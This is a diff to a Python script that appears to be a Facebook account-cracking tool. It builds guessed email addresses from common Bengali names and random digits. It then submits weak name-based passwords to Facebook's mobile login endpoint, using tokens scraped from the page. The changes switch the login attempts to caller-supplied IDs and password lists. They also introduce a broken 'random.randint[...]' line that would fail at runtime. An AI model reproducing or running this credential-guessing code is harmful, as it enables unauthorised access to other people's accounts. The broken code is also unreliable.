@@ -934,7 +934,7 @@ def g_clone():
     os.system('clear')
     print(logo)
     print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-    first = random.choice(['sumon','rakesh','rahul','raj','joy','pritam','sayan','ramesh','sagar','debraj','avi','abinash','ujjal','rakesh','subho','rakesh','akash','abhijit','abir','aditya','amit','arjun','bapi','basu','bikash','bikram','deep','dev','dipankar','gautam','jaydeb','kamal','lakesh','polash','rajib','sourav','sujay','sujit','anik',])
+    first = random.randint['sumon','rakesh','rahul','raj','joy','pritam','sayan','ramesh','sagar','debraj','avi','abinash','ujjal','rakesh','subho','rakesh','akash','abhijit','abir','aditya','amit','arjun','bapi','basu','bikash','bikram','deep','dev','dipankar','gautam','jaydeb','kamal','lakesh','polash','rajib','sourav','sujay','sujit','anik',]
     last = random.choice(['roy','das','sarkar','mondal','biswas','ghosh','saha','haldar','pal','ray',])
     domain = '@gmail.com'
     try:
@@ -942,7 +942,7 @@ def g_clone():
     except ValueError:
         limit = 5000
     for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(3))
+        nmp = ''.join(random.choice(string.digits) for _ in range(4))
         user.append(nmp)
     clear()
     print("                CHOOSE METHOD                       ")
@@ -2135,22 +2135,17 @@ def mail(uid,pwx,first,tl):
     try:
         for pw in pwx:
             Session = requests.Session()
-            firstt = random.choice(['sumon','rakesh','rahul','raj','joy','pritam','sayan','ramesh','sagar','debraj','avi','abinash','ujjal','rakesh','subho','rakesh','akash','abhijit','abir','aditya','amit','arjun','bapi','basu','bikash','bikram','deep','dev','dipankar','gautam','jaydeb','kamal','lakesh','polash','rajib','sourav','sujay','sujit','anik',])
-            lastt = random.choice(['roy','das','sarkar','mondal','biswas','ghosh','saha','haldar','pal','ray',])
-            nmnn = firstt+lastt
-            uiddd = nmnn+love+domain
-            pwg = random.choice([nmnn,firstt+'12',firstt+'123',firstt+'1234',firstt+'12345'])
             free_fb = Session.get('https://touch.facebook.com/').text
             data = {
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'email': uiddd,
+            'email': uid,
             'cred_type': '100',
             'login_source': 'device_based_login_add_account',
             'savepass': '',
             'next': '',
             'persistent': '',
-            'encpass':"#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pwg),}
+            'encpass':"#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
             cookies = {
             'ps_n': '1',
             'ps_l': '1',
